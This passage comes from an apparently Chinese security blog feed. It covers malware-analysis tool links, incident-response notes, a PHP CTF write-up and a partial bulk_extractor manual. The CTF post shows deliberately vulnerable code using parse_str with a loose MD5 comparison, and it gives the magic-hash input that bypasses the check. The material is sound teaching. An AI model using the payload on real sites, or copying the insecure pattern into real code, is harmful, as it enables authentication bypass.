的一个开源 x64/x32 调试器</li></ul><h2 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h2><p><em>分析网络交互</em></p><ul><li><a href="https://www.bro.org" target="_blank" rel="external">Bro</a> - 支持惊人规模的文件和网络协议的协议分析工具</li><li><a href="https://github.com/hempnall/broyara" target="_blank" rel="external">BroYara</a> - 基于 Bro 的 Yara 规则集</li><li><a href="https://github.com/omriher/CapTipper" target="_blank" rel="external">CapTipper</a> - 恶意 HTTP 流量管理器</li><li><a href="https://github.com/MITRECND/chopshop" target="_blank" rel="external">chopshop</a> - 协议分析和解码框架</li><li><a href="http://www.telerik.com/fiddler" target="_blank" rel="external">Fiddler</a> - 专为 Web 调试开发的 Web 代理</li><li><a href="https://github.com/pjlantz/Hale" target="_blank" rel="external">Hale</a> - 僵尸网络 C&amp;C 监视器</li><li><a href="http://www.haka-security.org/" target="_blank" rel="external">Haka</a> - 一个安全导向的开源语言，用于在实时流量捕获时描述协议、应用安全策略</li><li><a href="http://www.inetsim.org/" target="_blank" rel="external">INetSim</a> - 网络服务模拟。建设一个恶意软件分析实验室十分有用</li><li><a href="https://github.com/lmco/laikaboss" target="_blank" rel="external">Laika BOSS</a> - Laika BOSS 是一种以文件为中心的恶意软件分析和入侵检测系统</li><li><a href="https://github.com/tomchop/malcom" target="_blank" rel="external">Malcom</a> - 恶意软件通信分析仪</li><li><a href="https://github.com/stamparm/maltrail" target="_blank" rel="external">Maltrail</a> - 一个恶意流量检测系统，利用公开的黑名单来检测恶意和可疑的通信流量，带有一个报告和分析界面</li><li><a href="https://mitmproxy.org/" target="_blank" rel="external">mitmproxy</a> - 拦截网络流量通信</li><li><a href="https://github.com/aol/moloch" target="_blank" rel="external">Moloch</a> - IPv4 流量捕获，带有索引和数据库系统</li><li><a href="http://www.netresec.com/?page=NetworkMiner" target="_blank" rel="external">NetworkMiner</a> - 有免费版本的网络取证分析工具</li><li><a href="http://ngrep.sourceforge.net/" target="_blank" rel="external">ngrep</a> - 像 grep 一样收集网络流量</li><li><a href="https://github.com/mateuszk87/PcapViz" target="_blank" rel="external">PcapViz</a> - 网络拓扑与流量可视化</li><li><a href="http://www.tcpdump.org/" target="_blank" rel="external">Tcpdump</a> - 收集网络流</li><li><a href="http://tcpick.sourceforge.net/" target="_blank" rel="external">tcpick</a> - 从网络流量中重构 TCP 流</li><li><a href="http://tcpxtract.sourceforge.net/" target="_blank" rel="external">tcpxtract</a> - 从网络流量中提取文件</li><li><a href="https://www.wireshark.org/" target="_blank" rel="external">Wireshark</a> - 网络流量分析工具</li></ul><h2 id="内存取证"><a href="#内存取证" class="headerlink" title="内存取证"></a>内存取证</h2><p><em>在内存映像或正在运行的系统中分析恶意软件的工具</em></p><ul><li><a href="https://www.blackbagtech.com/blacklight.html" target="_blank" rel="external">BlackLight</a> - 支持 hiberfil、pagefile 与原始内存分析的 Windows / MacOS 取证客户端</li><li><a href="https://github.com/504ensicsLabs/DAMM" target="_blank" rel="external">DAMM</a> - 基于 Volatility 的内存中恶意软件的差异分析</li><li><a href="https://github.com/JamesHabben/evolve" target="_blank" rel="external">evolve</a> - 用于 Volatility Memory 取证框架的 Web 界面</li><li><a href="http://jessekornblum.livejournal.com/269749.html" target="_blank" rel="external">FindAES</a> - 在内存中寻找 AES 加密密钥</li><li><a href="https://github.com/ytisf/muninn" target="_blank" rel="external">Muninn</a> - 一个使用 Volatility 的自动化分析脚本，可以生成一份可读报告</li><li><a href="http://www.rekall-forensic.com/" target="_blank" rel="external">Rekall</a> - 内存分析框架，2013 年 Volatility 的分支版本</li><li><a href="https://github.com/sketchymoose/TotalRecall" target="_blank" rel="external">TotalRecall</a> - 基于 Volatility 自动执行多恶意样本分析任务的脚本</li><li><a href="https://github.com/aim4r/VolDiff" target="_blank" rel="external">VolDiff</a> - 在恶意软件执行前后，在内存映像中运行 Volatility 并生成对比报告</li><li><a href="https://github.com/volatilityfoundation/volatility" target="_blank" rel="external">Volatility</a> - 先进的内存取证框架</li><li><a href="https://github.com/kevthehermit/VolUtility" target="_blank" rel="external">VolUtility</a> - Volatility 内存分析框架的 Web 接口</li><li><a href="https://msdn.microsoft.com/en-us/windows/hardware/hh852365" target="_blank" rel="external">WinDbg</a> - Windows 系统的实时内存检查和内核调试工具</li></ul><h2 id="Windows平台神器"><a href="#Windows平台神器" class="headerlink" title="Windows平台神器"></a>Windows平台神器</h2><ul><li><a href="https://github.com/OMENScan/AChoir" target="_blank" rel="external">AChoir</a> - 一个用来收集 Windows 实时事件响应脚本集</li><li><a href="https://github.com/williballenthin/python-evt" target="_blank" rel="external">python-evt</a> - 用来解析 Windows 事件日志的 Python 库</li><li><a href="http://www.williballenthin.com/registry/" target="_blank" rel="external">python-registry</a> - 用于解析注册表文件的 Python 库</li><li><a href="https://regripper.wordpress.com/" target="_blank" rel="external">RegRipper</a> (<a href="https://github.com/keydet89/RegRipper2.8" target="_blank" rel="external">GitHub</a>) - 基于插件集的工具</li></ul><h2 id="存储和工作流"><a href="#存储和工作流" class="headerlink" title="存储和工作流"></a>存储和工作流</h2><ul><li><a href="https://github.com/trendmicro/aleph" target="_blank" rel="external">Aleph</a> - 开源恶意软件分析管道系统</li><li><a href="https://crits.github.io/" target="_blank" rel="external">CRITs</a> - 关于威胁、恶意软件的合作研究</li><li><a href="https://github.com/sroberts/malwarehouse" target="_blank" rel="external">Malwarehouse</a> - 存储、标注与搜索恶意软件</li><li><a href="https://github.com/ANSSI-FR/polichombr" target="_blank" rel="external">Polichombr</a> - 一个恶意软件分析平台，旨在帮助分析师逆向恶意软件。</li><li><a href="http://stoq.punchcyber.com/" target="_blank" rel="external">stoQ</a> - 分布式内容分析框架，具有广泛的插件支持</li><li><a href="http://viper.li/" target="_blank" rel="external">Viper</a> - 分析人员的二进制管理和分析框架</li></ul><h2 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h2><ul><li><a href="https://github.com/LordNoteworthy/al-khaser" target="_blank" rel="external">al-khaser</a> - 一个旨在突出反恶意软件系统的 PoC 恶意软件</li><li><a href="http://www.binar.ly/search" target="_blank" rel="external">Binarly</a> - 海量恶意软件字节的搜索引擎</li><li><a href="https://github.com/Defense-Cyber-Crime-Center/DC3-MWCP" target="_blank" rel="external">DC3-MWCP</a> - 反网络犯罪中心的恶意软件配置解析框架</li><li><a href="https://github.com/misterch0c/malSploitBase" target="_blank" rel="external">MalSploitBase</a> - 包含恶意软件利用的漏洞的数据库</li><li><a href="https://archive.org/details/malwaremuseum" target="_blank" rel="external">Malware Museum</a> - 收集 20 世纪八九十年代流行的恶意软件</li><li><a href="https://github.com/a0rtega/pafish" target="_blank" rel="external">Pafish</a> - Paranoid Fish，与恶意软件家族的行为一致，采用多种技术来检测沙盒和分析环境的演示工具</li><li><a href="https://remnux.org/" target="_blank" rel="external">REMnux</a> - 面向恶意软件逆向工程师和分析人员的 Linux 发行版和 Docker 镜像</li><li><a href="https://santoku-linux.com/" target="_blank" rel="external">Santoku Linux</a> - 移动取证的 Linux 发行版</li></ul><h1 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h1><h2 id="书籍"><a href="#书籍" class="headerlink" title="书籍"></a>书籍</h2><p><em>基础恶意软件分析阅读书单</em></p><ul><li><a href="https://amzn.com/dp/0470613033" target="_blank" rel="external">Malware Analyst’s Cookbook and DVD</a> - 打击恶意代码的工具和技术</li><li><a href="https://amzn.com/dp/1593272901" target="_blank" rel="external">Practical Malware Analysis</a> - 剖析恶意软件的手边书</li><li><a href="https://www.amzn.com/dp/0321240693" target="_blank" rel="external">Real Digital Forensics</a> - 计算机安全与应急响应</li><li><a href="https://amzn.com/dp/1118825098" target="_blank" rel="external">The Art of Memory Forensics</a> - 在 Windows、Linux 和 Mac 系统的内存中检测恶意软件和威胁</li><li><a href="https://amzn.com/dp/1593272898" target="_blank" rel="external">The IDA Pro Book</a> - 世界上最流行的反汇编器的非官方指南</li><li><a href="https://amzn.com/dp/144962636X" target="_blank" rel="external">Real Digital Forensics</a> - 用于移动取证、恶意软件分析的 Linux 发行版</li></ul><h2 id="Twitter"><a href="#Twitter" class="headerlink" title="Twitter"></a>Twitter</h2><p><em>一些相关的 Twitter 账户</em></p><ul><li>Adamb <a href="https://twitter.com/Hexacorn" target="_blank" rel="external">@Hexacorn</a></li><li>Andrew Case <a href="https://twitter.com/attrc" target="_blank" rel="external">@attrc</a></li><li>Binni Shah <a href="https://twitter.com/binitamshah" target="_blank" rel="external">@binitamshah</a></li><li>Claudio <a href="https://twitter.com/botherder" target="_blank" rel="external">@botherder</a></li><li>Dustin Webber <a href="https://twitter.com/mephux" target="_blank" rel="external">@mephux</a></li><li>Glenn <a href="https://twitter.com/hiddenillusion" target="_blank" rel="external">@hiddenillusion</a></li><li>jekil <a href="https://twitter.com/jekil" target="_blank" rel="external">@jekil</a></li><li>Jurriaan Bremer <a href="https://twitter.com/skier_t" target="_blank" rel="external">@skier_t</a></li><li>Lenny Zeltser <a href="https://twitter.com/lennyzeltser" target="_blank" rel="external">@lennyzeltser</a></li><li>Liam Randall <a href="https://twitter.com/hectaman" target="_blank" rel="external">@hectaman</a></li><li>Mark Schloesser <a href="https://twitter.com/repmovsb" target="_blank" rel="external">@repmovsb</a></li><li>Michael Ligh (MHL) <a href="https://twitter.com/iMHLv2" target="_blank" rel="external">@iMHLv2</a></li><li>Monnappa <a href="https://twitter.com/monnappa22" target="_blank" rel="external">@monnappa22</a></li><li>Open Malware <a href="https://twitter.com/OpenMalware" target="_blank" rel="external">@OpenMalware</a></li><li>Richard Bejtlich <a href="https://twitter.com/taosecurity" target="_blank" rel="external">@taosecurity</a></li><li>Volatility <a href="https://twitter.com/volatility" target="_blank" rel="external">@volatility</a></li></ul><h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><ul><li><a href="https://github.com/kbandla/APTnotes" target="_blank" rel="external">APT Notes</a> - 一个收集 APT 相关文献的合辑</li><li><a href="https://github.com/corkami/pics" target="_blank" rel="external">File Formats posters</a> - 常用文件格式的可视化（包括 PE 与 ELF）</li><li><a href="http://honeynet.org/" target="_blank" rel="external">Honeynet Project</a> - 蜜罐工具、论文和其他资源</li><li><a href="http://www.kernelmode.info/forum/" target="_blank" rel="external">Kernel Mode</a> - 一个致力于恶意软件分析和内核开发的活跃社区</li><li><a href="https://zeltser.com/malicious-software/" target="_blank" rel="external">Malicious Software</a> - Lenny Zeltser 的恶意软件博客和资源</li><li><a href="https://cse.google.com/cse/home?cx=011750002002865445766%3Apc60zx1rliu" target="_blank" rel="external">Malware Analysis Search</a> - <a href="journeyintoir.blogspot.com/">Corey Harrell</a> 自定义的用于恶意软件分析的 Google 搜索</li><li><a href="http://fumalwareanalysis.blogspot.nl/p/malware-analysis-tutorials-reverse.html" target="_blank" rel="external">Malware Analysis Tutorials</a> - 由 Xiang Fu 博士提供的恶意软件分析教程，是一个学习恶意软件分析的重要资源</li><li><a href="http://malware-traffic-analysis.net/" target="_blank" rel="external">Malware Samples and Traffic</a> - 此博客重点介绍与恶意软件感染相关的网络流量</li><li><a href="https://bluesoul.me/practical-malware-analysis-starter-kit/" target="_blank" rel="external">Practical Malware Analysis Starter Kit</a> - 此软件包包含 Practical Malware Analysis 书中引用的大多数软件</li><li><a href="http://windowsir.blogspot.com/p/malware.html" target="_blank" rel="external">WindowsIR: Malware</a> - Harlan Carvey 的恶意软件页面</li><li><a href="https://www.reddit.com/r/csirt_tools/" target="_blank" rel="external">csirt_tools</a> - CSIRT 工具和资源的子版块，讲<a href="https://www.reddit.com/r/csirt_tools/search?q=flair%3A%22Malware%20analysis%22&amp;sort=new&amp;restrict_sr=on" target="_blank" rel="external">恶意软件分析</a>的天才</li><li><a href="https://www.reddit.com/r/Malware" target="_blank" rel="external">Malware</a> - 恶意软件的子版块</li><li><a href="https://www.reddit.com/r/ReverseEngineering" target="_blank" rel="external">ReverseEngineering</a> - 逆向工程子版块，不仅限于恶意软件</li></ul><h1 id="相关清单"><a href="#相关清单" class="headerlink" title="相关清单"></a>相关清单</h1><ul><li><a href="https://github.com/ashishb/android-security-awesome" target="_blank" rel="external">Android Security</a></li><li><a href="https://github.com/paragonie/awesome-appsec" target="_blank" rel="external">AppSec</a></li><li><a href="https://github.com/apsdehal/awesome-ctf" target="_blank" rel="external">CTFs</a></li><li><a href="https://github.com/Cugu/awesome-forensics" target="_blank" rel="external">Forensics</a></li><li><a href="https://github.com/carpedm20/awesome-hacking" target="_blank" rel="external">“Hacking”</a></li><li><a href="https://github.com/paralax/awesome-honeypots" target="_blank" rel="external">Honeypots</a></li><li><a href="https://github.com/hslatman/awesome-industrial-control-system-security" target="_blank" rel="external">Industrial Control System Security</a></li><li><a href="https://github.com/meirwah/awesome-incident-response" target="_blank" rel="external">Incident-Response</a></li><li><a href="https://github.com/onlurking/awesome-infosec" target="_blank" rel="external">Infosec</a></li><li><a href="https://github.com/caesar0301/awesome-pcaptools" target="_blank" rel="external">PCAP Tools</a></li><li><a href="https://github.com/enaqx/awesome-pentest" target="_blank" rel="external">Pentesting</a></li><li><a href="https://github.com/sbilly/awesome-security" target="_blank" rel="external">Security</a></li><li><a href="https://github.com/hslatman/awesome-threat-intelligence" target="_blank" rel="external">Threat Intelligence</a></li></ul><h1 id="贡献"><a href="#贡献" class="headerlink" title="贡献"></a>贡献</h1><p>欢迎提出问题或者 Pull requests！请在提交 Pull request 之前阅读 <a href="https://github.com/sunnyelf/awesome-malware-analysis/blob/master/CONTRIBUTING.md" target="_blank" rel="external">CONTRIBUTING</a>。</p><h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p>这个列表需要感谢如下一些人:</p><ul><li>Lenny Zeltser 和 REMnux 的其他开发者贡献了这个列表中很多工具</li><li>Michail Hale Ligh、Steven Adair、Blake Hartstein 和 Mather Richard 著有 <em>Malware Analyst’s Cookbook</em>，这本书为这个列表的创建提供了很大的灵感</li><li>每一个提交 Pull request 以及提出建议的人</li></ul><p>十分感谢!</p>]]></content>
      
        <categories>
            
            <category> 取证分析 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> awesome </tag>
            
            <tag> 恶意软件分析 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[应急响应笔记]]></title>
      <url>/2017/10/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%AC%94%E8%AE%B0/</url>
      <content type="html"><![CDATA[<p><img src="/2017/10/03/应急响应笔记/0.png" alt="应急响应笔记"></p><h1 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h1><p>应急响应服务是指为了应对各种意外事件的发生所做的准备以及在事件发生后所采取的措施的服务。例如：系统被入侵、重要信息被窃取、系统拒绝服务、网络流量异常等。</p><h1 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h1><p>采取紧急措施和行动，恢复业务到正常状态；调查安全事件发生的原因，避免同类事件再次发生；在需要司法机关介入时，提供法律认可的数字证据。</p><h1 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h1><p>应急响应是一项需要充分准备并严密组织的工作，开展调查工作的过程中，要避免不正确的步骤或者遗漏重要步骤对系统产生新的影响。这就需要掌握一定的追踪能力、沟通能力的专业安全人员参与。安全厂商常年研究安全技术、实时跟踪安全动态，对分析和解决各类安全事件有成熟的技术手段和丰富的经验，能为其客户提供可靠的技术服务支持。每一次的应急响应客户不仅仅只是需要一个简单的应急和服务的可用性,更重要的是对黑客行为的全面分析,以资产为核心来分析黑客思维,尽可能明白整个事件的前因后果以及后续的安全排查加固等措施。</p><h1 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h1><p>从业务流程方式可以分为调查，评估，抑制，分析，恢复以及报告的流程。</p><h1 id="心得"><a href="#心得" class="headerlink" title="心得"></a>心得</h1><p>1.在开始接触应急业务之前一定要向客户询问详细事件的发生情况，比如事件发生时间（点或段），事件造成的实际破坏，客户的具体需求和要求。<br>2.根据了解情况先做攻击性质预判，迅速找出关键排查点，尽快恢复业务正常化，在实施过程中注意规范操作。</p><p><img src="/2017/10/03/应急响应笔记/1.png" alt="应急响应笔记"></p><p>3.通过对事件的定性以及取证后有选择的先分析重点内容，基本思路：</p><p><img src="/2017/10/03/应急响应笔记/2.png" alt="应急响应笔记"></p><p>4.先定性，在定向，后全量分析，对应排查工具：</p><p><img src="/2017/10/03/应急响应笔记/3.png" alt="应急响应笔记"></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="http://www.aokisec.com/archives/80/" target="_blank" rel="external">应急响应小总结</a></p>]]></content>
      
        <categories>
            
            <category> 取证分析 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[PHP CTF tricks parse_str and loose comparison]]></title>
      <url>/2017/09/29/PHP-CTF-tricks-parse-str-and-loose-comparison/</url>
      <content type="html"><![CDATA[<h2 id="0x00-题目"><a href="#0x00-题目" class="headerlink" title="0x00 题目"></a>0x00 题目</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">&lt;meta charset=<span class="string">"utf-8"</span>&gt;</div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($_GET[<span class="string">'str'</span>])) &#123;</div><div class="line">    show_source(<span class="keyword">__FILE__</span>);</div><div class="line">    <span class="keyword">die</span>();</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">    <span class="keyword">include</span>(<span class="string">'flag.php'</span>);</div><div class="line">    $url = <span class="string">"www.hackfun.org"</span>;</div><div class="line">    $str = $_GET[<span class="string">'str'</span>];</div><div class="line">    @parse_str($str);</div><div class="line">    <span class="keyword">if</span> ($url[<span class="number">0</span>] != <span class="string">'QNKCDZO'</span> &amp;&amp; md5($url[<span class="number">0</span>]) == md5(<span class="string">'QNKCDZO'</span>)) &#123;</div><div class="line">        <span class="keyword">echo</span> $flag;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">exit</span>(<span class="string">'Try angain :-)'</span>);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><h2 id="0x01-解题"><a href="#0x01-解题" class="headerlink" title="0x01 解题"></a>0x01 解题</h2><p>要得到flag首先要使<code>if ($url[0] != &#39;QNKCDZO&#39; &amp;&amp; md5($url[0]) == md5(&#39;QNKCDZO&#39;))</code>成立，也就是<code>$url[0] != &#39;QNKCDZO&#39;</code>和<code>md5($url[0]) == md5(&#39;QNKCDZO&#39;)</code>都成立，如果str正常传入情况下，<code>$url[0]</code>的值是’w’，满足第一个条件<code>$url[0] != &#39;QNKCDZO&#39;</code>，但是不满足<code>md5($url[0]) == md5(&#39;QNKCDZO&#39;)</code>，但是代码中写了<code>@parse_str($str)</code>;，而<a href="http://www.w3school.com.cn/php/func_string_parse_str.asp" target="_blank" rel="external">parse_str()</a>函数会把参数字符串当做php变量解析，也就是如果str传入的是<code>url[0]=hello</code>，那么就会解析成一个数组url，且数组url的第一个值为hello，此时<code>$url[0] != &#39;QNKCDZO&#39;</code>成立，<code>md5($url[0]) == md5(&#39;QNKCDZO&#39;)</code>不成立，但是至少<code>$url[0]</code>的值可控了，仔细研究<code>md5($url[0]) == md5(&#39;QNKCDZO&#39;)</code>，可以发现<code>md5(&#39;QNKCDZO&#39;)</code>的值为字符型的’0e830400451993494058024219903391’，但是根据<a href="http://php.net/manual/zh/language.operators.comparison.php" target="_blank" rel="external">PHP手册</a>的描述：如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换为数值并且比较按照数值来进行。其中0e是科学计数法，因为涉及到数字内容，所以就会转换为数值，而’0e830400451993494058024219903391’转换为数值也就是0*(10^830400451993494058024219903391) = 0，所以我们只需要使<code>url[0]</code>的MD5值为类似0e开头后面全为数字的字符串就可以让<code>md5($url[0]) == md5(&#39;QNKCDZO&#39;)</code>成立，通过搜索发现很多字符串都满足条件，具体满足条件的列表可看。</p><ul><li><a href="http://blog.csdn.net/kalbertlee/article/details/70213392" target="_blank" rel="external">0e开头MD5 python生成脚本 PHP哈希弱类型比较缺陷</a></li><li><a href="http://www.cnblogs.com/Primzahl/p/6018158.html" target="_blank" rel="external">PHP处理0e开头md5哈希字符串缺陷/bug</a></li></ul><p>我们选取240610708作为<code>url[0]</code>的值，也就是使str传入的值为<code>url[0]=240610708</code>，此时<code>$url[0] != &#39;QNKCDZO&#39;</code>成立，且<code>md5($url[0]) == md5(&#39;QNKCDZO&#39;)</code>也成立：</p><p><img src="/2017/09/29/PHP-CTF-tricks-parse-str-and-loose-comparison/flag.jpg" alt="flag"></p>]]></content>
      
        
        <tags>
            
            <tag> PHP CTF tricks </tag>
            
            <tag> parse_str </tag>
            
            <tag> loose comparison </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Kali Linux取证分析之bulk-extractor]]></title>
      <url>/2017/09/07/Kali-Linux%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E4%B9%8Bbulk-extractor/</url>
      <content type="html"><![CDATA[<h2 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h2><p>bulk_extractor是从数字证据文件中提取诸如电子邮件地址，信用卡号，URL和其他类型的信息的功能的程序。 它是一个有用的取证调查工具，可以用于许多任务，如恶意软件和入侵调查，身份调查和网络调查，以及图像分析和密码破解。 该程序提供了几个不寻常的功能：</p><pre><code>1.发现其他工具发现不了的信息，如电子邮件地址，URL和信用卡号码，得益于它能处理压缩数据（如ZIP，PDF和GZIP文件）以及不完整或部分损坏的数据。 它可以从压缩数据的片段中提取JPEG文件，办公文档和其他类型的文件 ，还可以自动检测并提取加密的RAR文件。
2.根据数据中发现的所有单词构建单词列表，甚至可以是在未分配空间的压缩文件中的数据。 这些单词列表可用于密码破解。
3.多线程的; 速度快节约时间
4.分析完之后创建直方图，显示电子邮件地址，URL，域名，搜索关键词和其他类型的信息。
</code></pre><p>bulk_extractor可以对磁盘映像，文件或文件目录进行分析，并在不分析文件系统或文件系统结构的情况下提取有用的信息。 输入被分割成页面并由一个或多个扫描器处理。 结果存储在特征文件中，可以使用其他自动化工具轻松检查，解析或处理。<br>bulk_extractor还创建了它所发现的特征的直方图。 这样非常有用，因为诸如电子邮件地址和网络搜索关键词的功能往往很常见且重要。<br>除了上述功能之外，bulk_extractor还包括以下功能：</p><pre><code>5.具有浏览特征文件中存储的功能以及启动bulk_extractor扫描的图形用户界面的Bulk Extractor Viewer
6.少量用于对特征文件进行额外分析的python程序
</code></pre><a id="more"></a><p>来源：<a href="http://digitalcorpora.org/downloads/bulk_extractor/BEUsersManual.pdf" target="_blank" rel="external">http://digitalcorpora.org/downloads/bulk_extractor/BEUsersManual.pdf</a><br><a href="https://github.com/simsong/bulk_extractor/" target="_blank" rel="external">主页</a> | <a href="http://git.kali.org/gitweb/?p=packages/bulk-extractor.git;a=summary" target="_blank" rel="external">仓库</a></p><ul><li>作者：Simson L. Garfinkel</li><li>证书：GPLv2</li></ul><h2 id="0x01-功能"><a href="#0x01-功能" class="headerlink" title="0x01 功能"></a>0x01 功能</h2><p>bulk_extractor - 在不解析文件系统的情况下提取信息。<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div></pre></td><td class="code"><pre><div class="line">bulk_extractor version 1.6.0-dev</div><div class="line">用法：bulk_extractor [选项] 文件</div><div class="line">运行bulk_extractor并提取摘要信息并输出到文件</div><div class="line"></div><div class="line">必需参数：</div><div class="line">   imagefile     - 要提取的文件</div><div class="line">或者-R filedir   - 遍历目录下的文件</div><div class="line">                  支持E01文件</div><div class="line">                  支持AFF文件</div><div class="line">   -o outdir     - 指定输出目录，目录不得已存在</div><div class="line">                  bulk_extractor将创建此目录</div><div class="line">选项：</div><div class="line">   -i                 - 信息模式。快速分析随机取样的样本并打印报告</div><div class="line">   -b banner.txt      - 将banner.txt内容添加到每个输出文件的头部</div><div class="line">   -r alert_list.txt  - 包含提醒作业的警报列表的文件</div><div class="line">                       （可以是特征文件或全局列表）</div><div class="line">                       （可以重复）</div><div class="line">   -w stop_list.txt   - 包含功能停止列表的文件（白名单）</div><div class="line">                       （可以是特征文件或全局列表）</div><div class="line">                       （可以重复）</div><div class="line">   -F &lt;rfile&gt;         - 从&lt;rfile&gt;读取正则表达式列表以查找</div><div class="line">   -f &lt;regex&gt;         - 查找出现的&lt;regex&gt;;可能重复。</div><div class="line">                        结果存入find.txt</div><div class="line">   -q nn              - 静默的模式;只输出nn级别的状态报告。默认值0; -1，没有状态输出</div><div class="line">   -s frac [：passes] - 设置随机抽样参数</div><div class="line"></div><div class="line">调整参数：</div><div class="line">   -C NN                            - 指定上下文窗口的大小（默认值为16）</div><div class="line">   -S fr:&lt;name&gt;:window = NN         - 指定录像机到NN的上下文窗口</div><div class="line">   -S fr:&lt;name&gt;:window_before = NN  - 指定之前的上下文窗口到NN为记录器</div><div class="line">   -S fr:&lt;name&gt;:window_after = NN   - 指定后缀到NN后的上下文窗口</div><div class="line">   -G NN                            - 指定页面大小（默认16777216）</div><div class="line">   -g NN                            - 指定余量（默认4194304）</div><div class="line">   -j NN                            - 要运行的分析线程数（默认4）</div><div class="line">   -M nn                            - 设置最大递归深度（默认7）</div><div class="line">   -m &lt;max&gt;                         - 所有数据读取后等待的最大分钟数（默认60）</div><div class="line"></div><div class="line">路径处理模式：</div><div class="line">   -p &lt;path&gt; / f - 以给定的格式打印&lt;path&gt;的值。</div><div class="line">                  格式：r = 源格式; h = 十六进制格式。</div><div class="line">                  指定-p - 进行交互模式</div><div class="line">                  指定-p -http为HTTP模式</div><div class="line"></div><div class="line">并行化：</div><div class="line">   -Y &lt;o1&gt;        - 在o1开始处理（o1可以是1，1K，1M或1G）</div><div class="line">   -Y &lt;o1&gt; - &lt;o2&gt; - 处理o1-o2</div><div class="line">   -A &lt;off&gt;       - 将&lt;off&gt;添加到所有报告的特征偏移</div><div class="line"></div><div class="line">调试：</div><div class="line">   -h     - 打印此消息</div><div class="line">   -H     - 打印扫描仪的详细信息</div><div class="line">   -V     - 打印版本号</div><div class="line">   -z nn  - 从第nn页开始</div><div class="line">   -dN    - 调试模式（参见源代码）</div><div class="line">   -Z     - 清除输出目录</div><div class="line"></div><div class="line">扫描控制：</div><div class="line">   -P &lt;dir&gt;       - 指定一个插件目录</div><div class="line">                    默认目录包括/usr/local/lib/bulk_extractor，/usr/lib/bulk_extractor和</div><div class="line">                    BE_PATH环境变量</div><div class="line">   -e &lt;scanner&gt;     启用扫描器 - -e all   全部启用</div><div class="line">   -x &lt;scanner&gt;     禁用扫描器 - -x all   全部禁用</div><div class="line">   -E &lt;scanner&gt;   - 